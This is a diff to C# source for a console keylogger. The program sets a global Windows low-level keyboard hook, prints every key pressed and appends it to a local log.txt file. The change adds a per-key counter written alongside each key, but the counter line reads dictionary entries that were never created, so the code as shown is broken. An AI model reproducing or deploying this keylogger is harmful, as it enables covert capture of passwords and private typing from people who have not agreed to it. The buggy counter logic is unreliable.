@@ -16,7 +16,7 @@ namespace ConsoleKeyLogger
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-
+        private static Dictionary<Keys, int> counter = new Dictionary<Keys, int>();
 
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -58,9 +58,7 @@ namespace ConsoleKeyLogger
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
-        }
-
-        
+        }        
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -76,8 +74,10 @@ namespace ConsoleKeyLogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
+                counter[(Keys)vkCode] = counter[(Keys)vkCode]+1;
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                 sw.Write((Keys)vkCode);
+                sw.Write(counter[(Keys)vkCode]);
                 sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
